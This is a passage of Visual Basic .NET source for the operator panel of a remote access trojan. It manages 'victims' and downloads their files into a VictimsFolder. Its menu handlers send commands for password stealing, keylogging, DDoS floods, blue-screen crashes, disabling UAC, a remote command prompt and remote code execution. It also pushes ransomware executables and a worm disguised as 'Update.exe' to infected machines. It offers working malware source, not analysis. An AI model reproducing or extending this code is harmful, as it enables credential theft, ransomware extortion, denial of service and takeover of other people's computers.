                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".BIN") Or itm.Text.EndsWith(".bak") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".dat") Or itm.Text.EndsWith(".DAT") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 14
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 15
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 16
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 17
                            ElseIf itm.Text.EndsWith(".pptx") Or itm.Text.EndsWith(".PPTX") Or itm.Text.EndsWith(".ppt") Or itm.Text.EndsWith(".PPT") Or itm.Text.EndsWith(".pps") Or itm.Text.EndsWith(".PPS") Or itm.Text.EndsWith(".pptm") Or itm.Text.EndsWith(".PPTM") Or itm.Text.EndsWith(".potx") Or itm.Text.EndsWith(".POTX") Or itm.Text.EndsWith(".potm") Or itm.Text.EndsWith(".POTM") Or itm.Text.EndsWith(".ppam") Or itm.Text.EndsWith(".PPAM") Or itm.Text.EndsWith(".ppsx") Or itm.Text.EndsWith(".PPSX") Or itm.Text.EndsWith(".ppsm") Or itm.Text.EndsWith(".PPSM") Then
                                itm.ImageIndex = 18
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".HTM") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".HTML") Then
                                itm.ImageIndex = 20
                            ElseIf itm.Text.EndsWith(".reg") Or itm.Text.EndsWith(".REG") Then
                                itm.ImageIndex = 19
                            ElseIf itm.Text.EndsWith(".AACCDB") Or itm.Text.EndsWith(".aaccdb") Or itm.Text.EndsWith(".ACCDE") Or itm.Text.EndsWith(".accde") Or itm.Text.EndsWith(".ACCDT") Or itm.Text.EndsWith(".accdt") Or itm.Text.EndsWith(".ACCDR") Or itm.Text.EndsWith(".accdr") Then
                                itm.ImageIndex = 21
                            ElseIf itm.Text.EndsWith(".xml") Or itm.Text.EndsWith(".XML") Then
                                itm.ImageIndex = 22
                            ElseIf itm.Text.EndsWith(".odt") Or itm.Text.EndsWith(".ODT") Or itm.Text.EndsWith(".ott") Or itm.Text.EndsWith(".OTT") Or itm.Text.EndsWith(".sxw") Or itm.Text.EndsWith(".SXW") Or itm.Text.EndsWith(".stw") Or itm.Text.EndsWith(".STW") Or itm.Text.EndsWith(".sor") Or itm.Text.EndsWith(".SOR") Or itm.Text.EndsWith(".sxc") Or itm.Text.EndsWith(".SXC") Or itm.Text.EndsWith(".stc") Or itm.Text.EndsWith(".STC") Or itm.Text.EndsWith(".sxi") Or itm.Text.EndsWith(".SXI") Or itm.Text.EndsWith(".sti") Or itm.Text.EndsWith(".STI") Or itm.Text.EndsWith(".sxd") Or itm.Text.EndsWith(".SXD") Or itm.Text.EndsWith(".std") Or itm.Text.EndsWith(".STD") Or itm.Text.EndsWith(".sxg") Or itm.Text.EndsWith(".SXG") Then
                                itm.ImageIndex = 23
                            ElseIf itm.Text.EndsWith(".temp") Or itm.Text.EndsWith(".TEMP") Or itm.Text.EndsWith(".tmp") Or itm.Text.EndsWith(".TMP") Then
                                itm.ImageIndex = 24
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 25
                            ElseIf itm.Text.EndsWith(".save") Or itm.Text.EndsWith(".SAVE") Or itm.Text.EndsWith(".sav") Or itm.Text.EndsWith(".SAV") Then
                                itm.ImageIndex = 26
                            ElseIf itm.Text.EndsWith(".crt") Or itm.Text.EndsWith(".CRT") Then
                                itm.ImageIndex = 27
                            ElseIf itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".JS") Then
                                itm.ImageIndex = 28
                            ElseIf itm.Text.EndsWith(".cat") Or itm.Text.EndsWith(".CAT") Then
                                itm.ImageIndex = 29
                            ElseIf itm.Text.EndsWith(".chm") Or itm.Text.EndsWith(".CHM") Then
                                itm.ImageIndex = 30
                            ElseIf itm.Text.EndsWith(".vmdk") Or itm.Text.EndsWith(".VMDK") Then
                                itm.ImageIndex = 31
                            ElseIf itm.Text.EndsWith(".vmx") Or itm.Text.EndsWith(".VMX") Then
                                itm.ImageIndex = 32
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 33
                            ElseIf itm.Text.EndsWith(".nfo") Or itm.Text.EndsWith(".NFO") Then
                                itm.ImageIndex = 34
                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                itm.ImageIndex = 35
                            ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                itm.ImageIndex = 36
                            ElseIf itm.Text.EndsWith(".resx") Or itm.Text.EndsWith(".RESX") Then
                                itm.ImageIndex = 37
                            ElseIf itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".CONFIG") Then
                                itm.ImageIndex = 38
                            ElseIf itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 39
                            ElseIf itm.Text.EndsWith(".settings") Or itm.Text.EndsWith(".SETTINGS") Then
                                itm.ImageIndex = 40
                            ElseIf itm.Text.EndsWith(".user") Or itm.Text.EndsWith(".USER") Or itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                itm.ImageIndex = 41
                            ElseIf itm.Text.EndsWith(".pdb") Or itm.Text.EndsWith(".PDB") Then
                                itm.ImageIndex = 42
                            ElseIf itm.Text.EndsWith(".xslt") Or itm.Text.EndsWith(".XSLT") Then
                                itm.ImageIndex = 43
                            ElseIf itm.Text.EndsWith(".obj") Or itm.Text.EndsWith(".OBJ") Then
                                itm.ImageIndex = 44
                            ElseIf itm.Text.EndsWith(".rc") Or itm.Text.EndsWith(".RC") Then
                                itm.ImageIndex = 45
                            ElseIf itm.Text.EndsWith(".inc") Or itm.Text.EndsWith(".INC") Or itm.Text.EndsWith(".lst") Or itm.Text.EndsWith(".LST") Then
                                itm.ImageIndex = 46
                            ElseIf itm.Text.EndsWith(".res") Or itm.Text.EndsWith(".RES") Then
                                itm.ImageIndex = 47
                            ElseIf itm.Text.EndsWith(".mdmp") Or itm.Text.EndsWith(".MDMP") Then
                                itm.ImageIndex = 48
                            ElseIf itm.Text.EndsWith(".ResmonCfg") Or itm.Text.EndsWith(".RESMONCFG") Then
                                itm.ImageIndex = 49
                            ElseIf itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".CONF") Or itm.Text.EndsWith(".leases") Or itm.Text.EndsWith(".LEASES") Then
                                itm.ImageIndex = 50
                            ElseIf itm.Text.EndsWith(".cur") Or itm.Text.EndsWith(".CUR") Then
                                itm.ImageIndex = 51
                            ElseIf itm.Text.EndsWith(".ani") Or itm.Text.EndsWith(".ANI") Then
                                itm.ImageIndex = 52
                            ElseIf itm.Text.EndsWith(".url") Or itm.Text.EndsWith(".URL") Then
                                itm.ImageIndex = 53
                            ElseIf itm.Text.EndsWith(".ttf") Or itm.Text.EndsWith(".TTF") Or itm.Text.EndsWith(".otf") Or itm.Text.EndsWith(".OTF") Then
                                itm.ImageIndex = 54
                            ElseIf itm.Text.EndsWith(".blend") Or itm.Text.EndsWith(".BLEND") Then
                                itm.ImageIndex = 55
                            ElseIf itm.Text.EndsWith(".icc") Or itm.Text.EndsWith(".ICC") Then
                                itm.ImageIndex = 56
                            ElseIf itm.Text.EndsWith(".a3x") Or itm.Text.EndsWith(".A3X") Or itm.Text.EndsWith(".au3") Or itm.Text.EndsWith(".AU3") Then
                                itm.ImageIndex = 57
                            Else
                                itm.ImageIndex = 8
                            End If
                            fff.ListView1.Items.Add(itm)
                            i += 1

                        Next
                        My.Computer.Audio.Play("C:\Windows\Media\Windows Navigation Start.wav", AudioPlayMode.Background)

                    End If
                Case "edittextfile"
                    If My.Application.OpenForms("Text_Editor" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf Data)
                        Me.Invoke(j, New Object() {sock, B})
                        Exit Sub
                    End If
                    Dim texter As New TextEditor
                    texter.sock = sock
                    texter.Name = "Text_Editor" & sock
                    texter.Text = texter.Text & " " & A(1) & " " & S.IP(sock)
                    texter.pathoftext = A(1)
                    texter.TextBox1.Text = A(2)
                    texter.Show()
                Case "getpath"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)
                    fff.TextBox1.Text = A(1)
                    S.Send(sock, "FileManager" & Yy & A(1))

                Case "downloadedfile"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)
                    Try
                        IO.File.WriteAllBytes((Application.StartupPath & "\VictimsFolder\" + fff.TextBox5.Text + "\Download\") & A(2), Convert.FromBase64String(A(1)))

                    Catch ex As Exception
                        IO.File.WriteAllBytes((Application.StartupPath & "\VictimsFolder\" + fff.TextBox5.Text & S.IP(sock) + "\Download\") & A(2), Convert.FromBase64String(A(1)))
                    End Try

                    fff.ListView2.Items.Add("_+ (" + fff.ListView1.Items.Item(fff.ListView1.FocusedItem.Index).SubItems.Item(0).Text & ") (Size " + fff.ListView1.Items.Item(fff.ListView1.FocusedItem.Index).SubItems.Item(1).Text + ")")
                    For Each Process As ListViewItem In fff.ListView2.Items
                        If Process.Text.Contains("_+ (") Then

                            Process.ForeColor = Color.DodgerBlue

                            Process.ImageIndex = 0

                        End If
                    Next

                    Thread.Sleep(1000)

                Case "viewimage"
                    Dim fff As FileManager = My.Application.OpenForms("\\" & sock)

                    If A(1) = "Error" Then
                        MsgBox("You cannot access this path", MsgBoxStyle.Exclamation)
                        fff.back()

                    Else

                        Dim picbyte() As Byte = Convert.FromBase64String(A(1))
                        Dim ms As New IO.MemoryStream(picbyte)
                        fff.pic1.Image = Image.FromStream(ms)





                    End If
            End Select
        Catch ex As Exception
        End Try
    End Sub
    Sub Connected(ByVal xxx As Integer) Handles S.Connected
        On Error Resume Next

        RichTextBox2.AppendText(S.IP(xxx) & " Connected" & vbNewLine)
        RichTextBox2.ScrollToCaret()

        S.Send(xxx, "info" & Yy)


        Insert(S.IP(xxx))

    End Sub

    Private Sub GetDevicesAndPrintersToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetDevicesAndPrintersToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "devicesinfo")
        Next
    End Sub

    Private Sub GetInstalledProgramsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetInstalledProgramsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "pro")

        Next
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FileManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "\\")

        Next
    End Sub

    Private Sub ServiceControllerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ServiceControllerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "ssopen")

        Next
    End Sub

    Private Sub ActiveWindowsManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ActiveWindowsManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Acti")

        Next
    End Sub

    Private Sub ProcessManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ProcessManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "OpenPro")

        Next
    End Sub

    Private Sub RegiestryEditorToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RegiestryEditorToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openRG")
        Next
    End Sub

    Private Sub RemoteLanViewerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteLanViewerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "viewlan")
        Next
    End Sub

    Private Sub ViewRemoteWifiToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewRemoteWifiToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "viewwifi")
        Next
    End Sub

    Private Sub OpenChatToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenChatToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openchat")
        Next
    End Sub

    Private Sub RemotePasswordStealerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemotePasswordStealerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "passwords")
        Next
    End Sub

    Private Sub RemoteKeyloggerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteKeyloggerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openkl")
        Next
    End Sub

    Private Sub FullComputerInformationToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FullComputerInformationToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems

            S.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub

    Private Sub NormalDDOSPingToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles NormalDDOSPingToolStripMenuItem.Click
        Dim str1 As String = Interaction.InputBox("IP / Web site :", "DDos Attacker", "", -1, -1)
        Dim str2 As String = Interaction.InputBox("Attack Speed", "8000 or 10000 or 12000 or 15000", "", -1, -1)
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "ddos" & Yy & str1 & Yy & str2)
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub KillerDDOSFloodToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles KillerDDOSFloodToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "FLOOD")
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub RemoteFunManagerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteFunManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "startfun")
        Next
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FromDiskToolStripMenuItem.Click
        'run from disk 
        On Error Resume Next
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.ToolTipText, "sendfile" & Yy & n.Name & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub FromURLToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FromURLToolStripMenuItem.Click
        Dim a As String = InputBox("Enter Direct URL", "Download")
        Dim aa As String = InputBox("Enter the name of the file", "Download")
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "download" & Yy & a & Yy & aa)
        Next
    End Sub

    Private Sub DefailtBrowserToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DefailtBrowserToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = c
            S.Send(x.ToolTipText, "openurl" & Yy & "Default" & Yy & c)
        Next
    End Sub

    Private Sub GoogleChromeToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GoogleChromeToolStripMenuItem.Click
        'google
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = c
            S.Send(x.ToolTipText, "openurl" & Yy & "Chrome" & Yy & c)
        Next
    End Sub

    Private Sub OperaMiniToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OperaMiniToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = c
            S.Send(x.ToolTipText, "openurl" & Yy & "Opera" & Yy & c)
        Next
    End Sub

    Private Sub FireFoxToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles FireFoxToolStripMenuItem.Click
        'Fire fox
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = c
            S.Send(x.ToolTipText, "openurl" & Yy & "firefox" & Yy & c)
        Next
    End Sub

    Private Sub InternetExplorerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles InternetExplorerToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = c
            S.Send(x.ToolTipText, "openurl" & Yy & "iexplore" & Yy & c)
        Next
    End Sub

    Private Sub RestartToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "restart")
        Next
    End Sub

    Private Sub RenameToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim b As String = InputBox("Enter New Name : ")
        For Each x As ListViewItem In L1.SelectedItems
            x.Text = b
            S.Send(x.ToolTipText, "rename" & Yy & b)
        Next
    End Sub

    Private Sub CeateWifiHotspotToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CeateWifiHotspotToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "hotspot")
        Next
    End Sub

    Private Sub ViewNetworkConnectionsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewNetworkConnectionsToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "stat")
        Next
    End Sub

    Private Sub GetClipboardToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetClipboardToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "clipss")
        Next
    End Sub

    Private Sub RemoteCommandPromptToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteCommandPromptToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "rss")
        Next
    End Sub

    Private Sub RemoteRunProcessToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteRunProcessToolStripMenuItem.Click
        Dim name As String = InputBox("ProcessName", "Process Name")
        If name = "" Then

        Else
            For Each x As ListViewItem In L1.SelectedItems

                S.Send(x.ToolTipText, "newpr" & Yy & name)
            Next
        End If
    End Sub

    Private Sub RemoteWebsitePortScannerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RemoteWebsitePortScannerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "sitescanner")
        Next
    End Sub



    Private Sub BlueScreenOfDeathToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles BlueScreenOfDeathToolStripMenuItem.Click
        For Each x As ListViewItem In L1.Items
            S.Send(x.ToolTipText, "bsod")
        Next
    End Sub

    Private Sub EnableUACToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles EnableUACToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "UACon")
        Next
    End Sub

    Private Sub DisableUACToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DisableUACToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "UACoff")
        Next
    End Sub

    Private Sub RunRemoteCodeToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunRemoteCodeToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "code")

        Next
    End Sub

    Private Sub CyberSplitterVbsRansomToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CyberSplitterVbsRansomToolStripMenuItem.Click
        Dim ransompath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "vbsransom[Don`t_Run].exe"


        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "ransom" & Yy & "ransom.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ransompath)))

        Next
    End Sub

    Private Sub SaherBlueEagleDestroyerToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles SaherBlueEagleDestroyerToolStripMenuItem.Click
        Dim ransompath As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "sblransom[Don`t_Run].exe"


        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "ransom" & Yy & "ransom.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(ransompath)))

        Next
    End Sub

    Private Sub BlackShadesNetButton6_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton6.Click
        noip.Show()
    End Sub

    Private Sub BlackShadesNetButton5_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton5.Click
        Build_Worm.Show()
    End Sub

    Private Sub BlackShadesNetButton8_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton8.Click
        Dropper_Builder.Show()
    End Sub

    Private Sub BlackShadesNetButton7_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton7.Click
        About.Show()
    End Sub
    Private Sub ContextMenuStrip1_Opening(sender As System.Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening
        If L1.SelectedItems.Count = 0 Then
            For Each item As ToolStripMenuItem In ContextMenuStrip1.Items

                item.Enabled = False

            Next
        End If
        For Each x As ListViewItem In L1.SelectedItems

            If x.Text.Contains("-Worm") Then
                For Each item As ToolStripMenuItem In ContextMenuStrip1.Items
                    If item.Text.Contains("Desktop") Or item.Text.Contains("File") Or item.Text.Contains("Url") Or item.Text.Contains("Server") Then
                        item.Enabled = True
                    Else
                        item.Enabled = False
                    End If
                Next
            Else
                For Each item As ToolStripMenuItem In ContextMenuStrip1.Items

                    item.Enabled = True

                Next
            End If

        Next
    End Sub



    Private Sub BlackShadesNetButton3_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton3.Click
        'Transfer victims
        Dim stub, text1, text2 As String
        Const spl As String = "abccba"
        If TextBox2.Text & TextBox3.Text = "" Then
            MsgBox("Complete Information Please At least Host & Port ", MsgBoxStyle.Critical, "Transfer Victims")
        Else

            If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe") Then
                My.Computer.FileSystem.DeleteFile(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe")
            End If
            text1 = TextBox2.Text
            text2 = TextBox3.Text

            Dim temp As String = IO.Path.GetTempPath() & "Worm.exe"

            File.WriteAllBytes(temp, My.Resources.SpyByte_Pal_Worm_)

            FileOpen(1, temp, OpenMode.Binary, OpenAccess.Read, OpenShare.Default)
            stub = Space(LOF(1))
            FileGet(1, stub)
            FileClose(1)
            FileOpen(1, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
            FilePut(1, stub & spl & text1 & spl & text2 & spl & "False")
            FileClose(1)

        End If
        If My.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe") Then
            For Each x As ListViewItem In L1.Items
                S.Send(x.ToolTipText, "sendfile" & Yy & "Update.exe" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "transfer.exe")))
            Next
        End If
        MsgBox("Transfer Victims is almost Done" & vbNewLine & "Please Open another instance of the RAT on Port : " & text2, MsgBoxStyle.ApplicationModal)
    End Sub

    Private Sub OpenVictimFolderToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles OpenVictimFolderToolStripMenuItem.Click
        Dim Victimname As String = ""
        If L1.FocusedItem.Text.Contains("Windows 10") Then
            Victimname = L1.FocusedItem.Text.Replace("Windows 10", "").Replace(vbNewLine, "")
        End If

        If L1.FocusedItem.Text.Contains("Windows 8.1") Then
            Victimname = L1.FocusedItem.Text.Replace("Windows 8.1", "").Replace(vbNewLine, "")
        End If
        If L1.FocusedItem.Text.Contains("Windows 7") Then
            Victimname = L1.FocusedItem.Text.Replace("Windows 7", "").Replace(vbNewLine, "")
        End If
        If L1.FocusedItem.Text.Contains("Windows Vista") Then
            Victimname = L1.FocusedItem.Text.Replace("Windows Vista", "").Replace(vbNewLine, "")
        End If

        If L1.FocusedItem.Text.Contains("Windows XP") Then
            Victimname = L1.FocusedItem.Text.Replace("Windows XP", "").Replace(vbNewLine, "")
        End If

        If L1.FocusedItem.Text.Contains("Uinux[MAC][iOS]") Then
            Victimname = L1.FocusedItem.Text.Replace("Uinux[MAC][iOS]", "").Replace(vbNewLine, "")
        End If

        If L1.FocusedItem.Text.Contains("Unknowen OS ") Then
            Victimname = L1.FocusedItem.Text.Replace("Unknowen OS ", "").Replace(vbNewLine, "")
        End If
        If Victimname = "" Then
            MsgBox("Cannot Open Selected Victim Folder" & vbNewLine & "Please Open it manual", MsgBoxStyle.Critical)
        Else
            'The system cannot find the file specified
            Try
                Process.Start(Application.StartupPath & "\VictimsFolder\" + Victimname)
            Catch ex As Exception
                If ex.Message.Contains("cannot find the file specified") Then
